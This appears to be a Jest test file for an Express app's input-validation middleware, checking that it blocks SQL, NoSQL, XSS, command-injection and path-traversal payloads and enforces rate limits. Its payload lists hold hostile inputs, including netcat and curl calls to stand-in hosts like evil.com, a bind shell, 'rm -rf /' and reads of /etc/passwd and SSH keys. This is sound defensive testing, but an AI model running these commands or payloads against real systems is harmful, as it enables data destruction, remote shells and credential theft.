const request = require('supertest');
const express = require('express');
const jwt = require('jsonwebtoken');
const User = require('../models/User');
const { connectDB, disconnectDB, clearDB } = require('./setup');
const {
  securityValidation,
  preventSQLInjection,
  preventNoSQLInjection,
  preventXSS,
  preventCommandInjection,
  preventPathTraversal
} = require('../middleware/validation');

// Mock app for testing
function createTestApp() {
  const app = express();
  app.use(express.json());
  return app;
}

// Mock user for authentication tests
const mockUser = {
  _id: '507f1f77bcf86cd799439011',
  walletAddress: '0x742d35cc6634c0532925a3b8d4c9db96c4b4d8b1',
  role: 'student',
  permissions: { canIssue: false, canVerify: true, canTransfer: false }
};

// Generate mock JWT token
function generateMockToken() {
  return jwt.sign(
    { userId: mockUser._id, walletAddress: mockUser.walletAddress },
    process.env.JWT_SECRET || 'test-secret',
    { expiresIn: '1h' }
  );
}

describe('Security Validation Tests', () => {
  beforeAll(async () => {
    await connectDB();
  });

  afterAll(async () => {
    await disconnectDB();
  });

  beforeEach(async () => {
    await clearDB();
  });

  describe('SQL Injection Prevention', () => {
    let app;

    beforeEach(() => {
      app = createTestApp();
      app.post('/test', preventSQLInjection, (req, res) => {
        res.json({ success: true, data: req.body });
      });
    });

    const sqlInjectionPayloads = [
      // Basic SQL injection
      { query: "'; DROP TABLE users; --" },
      { query: "1' OR '1'='1" },
      { query: "admin'--" },
      { query: "' OR 1=1--" },
      
      // Union-based injection
      { query: "' UNION SELECT * FROM users--" },
      { query: "1' UNION SELECT username, password FROM users--" },
      
      // Boolean-based blind injection
      { query: "1' AND (SELECT COUNT(*) FROM users) > 0--" },
      { query: "1' AND SUBSTRING(@@version,1,1)='5'--" },
      
      // Time-based blind injection
      { query: "1'; WAITFOR DELAY '00:00:05'--" },
      { query: "1' AND (SELECT SLEEP(5))--" },
      
      // Stored procedure attacks
      { query: "'; EXEC xp_cmdshell('dir')--" },
      { query: "'; EXEC sp_executesql N'SELECT * FROM users'--" },
      
      // Case variations
      { query: "'; dRoP tAbLe users; --" },
      { query: "1' oR '1'='1" },
      
      // Encoded variations
      { query: "%27%20OR%20%271%27%3D%271" }, // ' OR '1'='1
      { query: "%3B%20DROP%20TABLE%20users%3B%20--" } // ; DROP TABLE users; --
    ];

    test.each(sqlInjectionPayloads)('should block SQL injection: $query', async (payload) => {
      const response = await request(app)
        .post('/test')
        .send(payload);
      
      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Invalid input detected');
    });

    test('should allow safe queries', async () => {
      const safePayloads = [
        { query: 'normal search term' },
        { query: 'user@example.com' },
        { query: 'John Doe' },
        { query: '2023-12-01' }
      ];

      for (const payload of safePayloads) {
        const response = await request(app)
          .post('/test')
          .send(payload);
        
        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
      }
    });
  });

  describe('NoSQL Injection Prevention', () => {
    let app;

    beforeEach(() => {
      app = createTestApp();
      app.post('/test', preventNoSQLInjection, (req, res) => {
        res.json({ success: true, data: req.body });
      });
    });

    const nosqlInjectionPayloads = [
      // MongoDB operator injection
      { username: { $ne: null } },
      { username: { $regex: '.*' } },
      { username: { $where: 'this.username == "admin"' } },
      { username: { $gt: '' } },
      
      // JavaScript injection
      { username: { $where: 'function() { return true; }' } },
      { username: { $where: 'sleep(5000)' } },
      
      // Dot notation attacks
      { 'user.role': 'admin' },
      { 'profile.isAdmin': true },
      
      // Array-based attacks
      { username: ['admin', 'user'] },
      { $or: [{ username: 'admin' }, { role: 'admin' }] },
      
      // Complex nested attacks
      { 
        $where: 'this.username == "admin"',
        $or: [{ role: 'admin' }]
      }
    ];

    test.each(nosqlInjectionPayloads)('should block NoSQL injection: %p', async (payload) => {
      const response = await request(app)
        .post('/test')
        .send(payload);
      
      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Invalid input detected');
    });
  });

  describe('XSS Prevention', () => {
    let app;

    beforeEach(() => {
      app = createTestApp();
      app.post('/test', preventXSS, (req, res) => {
        res.json({ success: true, data: req.body });
      });
    });

    const xssPayloads = [
      // Basic script injection
      { content: '<script>alert("xss")</script>' },
      { content: '<script src="http://evil.com/xss.js"></script>' },
      
      // Event handler injection
      { content: '<img src="x" onerror="alert(1)">' },
      { content: '<div onclick="alert(1)">Click me</div>' },
      { content: '<body onload="alert(1)">' },
      { content: '<input onfocus="alert(1)" autofocus>' },
      
      // JavaScript protocol
      { content: '<a href="javascript:alert(1)">Click</a>' },
      { content: '<iframe src="javascript:alert(1)"></iframe>' },
      
      // Data URI attacks
      { content: '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>' },
      
      // SVG-based XSS
      { content: '<svg onload="alert(1)"></svg>' },
      { content: '<svg><script>alert(1)</script></svg>' },
      
      // CSS-based attacks
      { content: '<style>@import"javascript:alert(1)"</style>' },
      { content: '<link rel="stylesheet" href="javascript:alert(1)">' },
      
      // Encoded variations
      { content: '&lt;script&gt;alert(1)&lt;/script&gt;' },
      { content: '%3Cscript%3Ealert(1)%3C/script%3E' },
      
      // Case variations
      { content: '<ScRiPt>alert(1)</ScRiPt>' },
      { content: '<IMG SRC="x" ONERROR="alert(1)">' }
    ];

    test.each(xssPayloads)('should block XSS: $content', async (payload) => {
      const response = await request(app)
        .post('/test')
        .send(payload);
      
      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Invalid input detected');
    });
  });

  describe('Command Injection Prevention', () => {
    let app;

    beforeEach(() => {
      app = createTestApp();
      app.post('/test', preventCommandInjection, (req, res) => {
        res.json({ success: true, data: req.body });
      });
    });

    const commandInjectionPayloads = [
      // Basic command injection
      { command: 'ls -la; rm -rf /' },
      { command: 'cat /etc/passwd' },
      { command: 'whoami && id' },
      
      // Pipe-based attacks
      { command: 'echo test | nc attacker.com 4444' },
      { command: 'ls | grep secret' },
      
      // Background execution
      { command: 'sleep 10 &' },
      { command: 'nohup malicious_script.sh &' },
      
      // Command substitution
      { command: 'echo $(whoami)' },
      { command: 'echo `id`' },
      { command: 'file.txt$(curl http://evil.com)' },
      
      // Windows commands
      { command: 'dir & del /f /q *.*' },
      { command: 'cmd.exe /c dir' },
      { command: 'powershell -Command "Get-Process"' },
      { command: 'net user admin password /add' },
      
      // Network commands
      { command: 'wget http://evil.com/shell.sh' },
      { command: 'curl -O http://evil.com/malware.exe' },
      { command: 'nc -l -p 4444 -e /bin/sh' },
      
      // File operations
      { command: 'rm -rf /important/data' },
      { command: 'format c: /y' },
      { command: 'dd if=/dev/zero of=/dev/sda' }
    ];

    test.each(commandInjectionPayloads)('should block command injection: $command', async (payload) => {
      const response = await request(app)
        .post('/test')
        .send(payload);
      
      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Invalid input detected');
    });
  });

  describe('Path Traversal Prevention', () => {
    let app;

    beforeEach(() => {
      app = createTestApp();
      app.post('/test', preventPathTraversal, (req, res) => {
        res.json({ success: true, data: req.body });
      });
    });

    const pathTraversalPayloads = [
      // Basic path traversal
      { path: '../../../etc/passwd' },
      { path: '..\\..\\..\\windows\\system32\\config\\sam' },
      
      // URL encoded
      { path: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' },
      { path: '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32' },
      
      // Double encoded
      { path: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd' },
      
      // Mixed encoding
      { path: '..%2f..%2f..%2fetc%2fpasswd' },
      { path: '..%5c..%5c..%5cwindows%5csystem32' },
      
      // Null byte injection
      { path: '../../../etc/passwd%00.jpg' },
      { path: '..\\..\\..\\windows\\system32%00.txt' },
      
      // Multiple slashes
      { path: '....//....//....//etc/passwd' },
      { path: '....\\\\....\\\\....\\\\windows\\system32' },
      
      // Unicode variations
      { path: '\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd' },
      
      // Absolute paths
      { path: '/etc/passwd' },
      { path: 'C:\\windows\\system32\\config\\sam' },
      
      // Home directory access
      { path: '~/.ssh/id_rsa' },
      { path: '~/.bash_history' }
    ];

    test.each(pathTraversalPayloads)('should block path traversal: $path', async (payload) => {
      const response = await request(app)
        .post('/test')
        .send(payload);
      
      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
      expect(response.body.error).toBe('Invalid input detected');
    });
  });

  describe('Advanced Bypass Attempts', () => {
    let app;

    beforeEach(() => {
      app = createTestApp();
      app.post('/test', ...securityValidation(), (req, res) => {
        res.json({ success: true, data: req.body });
      });
    });

    describe('Encoding bypass attempts', () => {
      const encodingBypassPayloads = [
        // Double URL encoding
        { data: '%2527%2520OR%2520%25271%2527%253D%25271' }, // '' OR '1'='1
        
        // HTML entity encoding
        { data: '&lt;script&gt;alert(1)&lt;/script&gt;' },
        
        // Unicode encoding
        { data: '\u003cscript\u003ealert(1)\u003c/script\u003e' },
        
        // Base64 encoding (if decoded somewhere)
        { data: 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' }, // <script>alert(1)</script>
        
        // Hex encoding
        { data: '0x3c736372697074' } // <script
      ];

      test.each(encodingBypassPayloads)('should prevent encoding bypass: $data', async (payload) => {
        const response = await request(app)
          .post('/test')
          .send(payload);
        
        // Should either block or sanitize the input
        expect([200, 400]).toContain(response.status);
        if (response.status === 200) {
          // If allowed, ensure it's been sanitized
          expect(response.body.data.data).not.toContain('<script>');
          expect(response.body.data.data).not.toContain('DROP TABLE');
        }
      });
    });

    describe('Polyglot attacks', () => {
      const polyglotPayloads = [
        // SQL + XSS polyglot
        { data: "'; alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>" },
        
        // Command + SQL polyglot
        { data: "'; ls -la; SELECT * FROM users; --" },
        
        // XSS + Command polyglot
        { data: "<script>alert(1)</script>; rm -rf /" }
      ];

      test.each(polyglotPayloads)('should prevent polyglot attacks: $data', async (payload) => {
        const response = await request(app)
          .post('/test')
          .send(payload);
        
        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.error).toBe('Invalid input detected');
      });
    });

    describe('Time-based attacks', () => {
      test('should handle time-based SQL injection attempts', async () => {
        const timeBasedPayloads = [
          { query: "1'; WAITFOR DELAY '00:00:05'--" },
          { query: "1' AND (SELECT SLEEP(5))--" },
          { query: "1'; pg_sleep(5)--" }
        ];

        for (const payload of timeBasedPayloads) {
          const startTime = Date.now();
          const response = await request(app)
            .post('/test')
            .send(payload);
          const endTime = Date.now();
          
          // Should be blocked immediately, not after delay
          expect(endTime - startTime).toBeLessThan(1000);
          expect(response.status).toBe(400);
        }
      });
    });

    describe('Large payload attacks', () => {
      test('should handle oversized payloads', async () => {
        const largePayload = {
          data: 'A'.repeat(1000000) // 1MB of data
        };

        const response = await request(app)
          .post('/test')
          .send(largePayload);
        
        // Should be rejected due to size limits
        expect([400, 413]).toContain(response.status);
      });
    });

    describe('Nested object attacks', () => {
      test('should handle deeply nested malicious objects', async () => {
        const nestedPayload = {
          level1: {
            level2: {
              level3: {
                level4: {
                  level5: {
                    malicious: "'; DROP TABLE users; --"
                  }
                }
              }
            }
          }
        };

        const response = await request(app)
          .post('/test')
          .send(nestedPayload);
        
        expect(response.status).toBe(400);
        expect(response.body.error).toBe('Invalid input detected');
      });
    });
  });

  describe('Rate Limiting Tests', () => {
    let app;

    beforeEach(() => {
      app = createTestApp();
      app.post('/test', ...securityValidation({
        enableRateLimit: true,
        rateLimitOptions: { windowMs: 60000, max: 3 } // 3 requests per minute
      }), (req, res) => {
        res.json({ success: true });
      });
    });

    test('should enforce rate limits', async () => {
      // First 3 requests should succeed
      for (let i = 0; i < 3; i++) {
        const response = await request(app)
          .post('/test')
          .send({ data: `request ${i}` });
        
        expect(response.status).toBe(200);
      }

      // 4th request should be rate limited
      const response = await request(app)
        .post('/test')
        .send({ data: 'request 4' });
      
      expect(response.status).toBe(429);
      expect(response.body.error).toContain('Too many requests');
    });
  });
});

describe('Input Sanitization Tests', () => {
  let app;

  beforeEach(() => {
    app = createTestApp();
    app.post('/test', ...securityValidation({
      enableSanitization: true
    }), (req, res) => {
      res.json({ success: true, data: req.body });
    });
  });

  test('should sanitize HTML content', async () => {
    const payload = {
      name: '<script>alert("xss")</script>John Doe',
      bio: '<img src="x" onerror="alert(1)">Software Engineer'
    };

    const response = await request(app)
      .post('/test')
      .send(payload);
    
    expect(response.status).toBe(200);
    expect(response.body.data.name).toBe('John Doe');
    expect(response.body.data.bio).toBe('Software Engineer');
  });

  test('should trim whitespace', async () => {
    const payload = {
      name: '   John Doe   ',
      email: '  john@example.com  '
    };

    const response = await request(app)
      .post('/test')
      .send(payload);
    
    expect(response.status).toBe(200);
    expect(response.body.data.name).toBe('John Doe');
    expect(response.body.data.email).toBe('john@example.com');
  });
});